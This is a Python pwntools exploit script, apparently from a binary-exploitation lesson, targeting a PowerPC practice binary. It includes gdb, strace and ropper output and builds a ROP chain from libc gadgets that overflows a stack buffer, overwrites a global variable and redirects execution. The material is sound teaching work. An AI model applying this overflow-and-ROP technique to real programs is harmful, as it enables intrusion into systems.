#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x1000054c <+0>:	stwu    r1,-144(r1)
...
   0x100005a0 <+84>:	lwz     r0,4(r11)
   0x100005a4 <+88>:	mtlr    r0
   0x100005a8 <+92>:	lwz     r31,-4(r11)
   0x100005ac <+96>:	mr      r1,r11
   0x100005b0 <+100>:	blr
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x10000560: file src/08-overwrite-global.c, line 9.
(gdb) b *0x100005a0
Breakpoint 2 at 0x100005a0: file src/08-overwrite-global.c, line 14.
(gdb) b *0x100005b0
Breakpoint 3 at 0x100005b0: file src/08-overwrite-global.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/08-overwrite-global.c:9
9		printf("> ");
(gdb) p &buffer[0]
$1 = 0xffffdd58 "\377\377"
(gdb) c
Continuing.

Breakpoint 2, 0x100005a0 in vulnerable () at src/08-overwrite-global.c:14
14	}
(gdb) p/x $r11+4
$2 = 0xffffdde4
(gdb) c
Continuing.

Breakpoint 3, 0x100005b0 in vulnerable () at src/08-overwrite-global.c:14
14	}
(gdb) i r $r1
r1             0xffffdde0	4294958560
"""

"""
$ qemu-ppc -L /usr/powerpc-linux-gnu/ -strace ./bin/ppc/08-overwrite-global
...
19357 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
19357 mmap2(0x0fe2c000,1848680,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0fe2c000
...
"""

"""
$ ropper --nocolor --inst-count 9 --file /usr/powerpc-linux-gnu/lib/libc-2.27.so
0x00146050: lwz r0, 0x44(r1); lwz r25, 0x24(r1); lwz r30, 0x38(r1); addi r1, r1, 0x40; mtlr r0; blr;
0x0013f2bc: lwz r0, 0x34(r1); lwz r27, 0x1c(r1); lwz r30, 0x28(r1); addi r1, r1, 0x30; mtlr r0; blr;
0x0008a5ec: lwz r29, 0x14(r1); lwz r0, 0x24(r1); lwz r30, 0x18(r1); addi r1, r1, 0x20; mtlr r0; blr;
0x000b6ce4: stw r29, 0(r27); mtctr r25; bctr;
"""

import struct
import sys

from pwn import *

context(arch='powerpc', os='linux', endian='big', word_size=32)

binary_path = './bin/ppc/08-overwrite-global'

saved_pc_addr = 0xffffdde4
buffer_addr = 0xffffdd58
libc_addr = 0x0fe2c000

lwz_r25_addr = libc_addr + 0x00146050
lwz_r27_addr = libc_addr + 0x0013f2bc
lwz_r29_addr = libc_addr + 0x0008a5ec
stw_r29_r27_mtctr_r25_addr = libc_addr + 0x000b6ce4

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']
x_addr = binary.symbols['x']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p32(lwz_r25_addr)
# <- $r1 + 8
payload += 'b' * (0x24 - 8)
payload += p32(not_called_addr) # r25
payload += 'c' * (0x44 - 0x24 - 4)
payload += p32(lwz_r27_addr) # r0
# <- $r1 + 8
payload += 'e' * (0x1c - 8)
payload += p32(x_addr) # r27
payload += 'f' * (0x34 - 0x1c - 4)
payload += p32(lwz_r29_addr) # r0
# <- $r1 + 8
payload += 'f' * (0x14 - 8)
payload += p32(0xbeefc0de) # r29
payload += 'h' * (0x24 - 0x14 - 4)
payload += p32(stw_r29_r27_mtctr_r25_addr) # r0

p.readuntil('> ')
p.write(payload)
p.interactive()
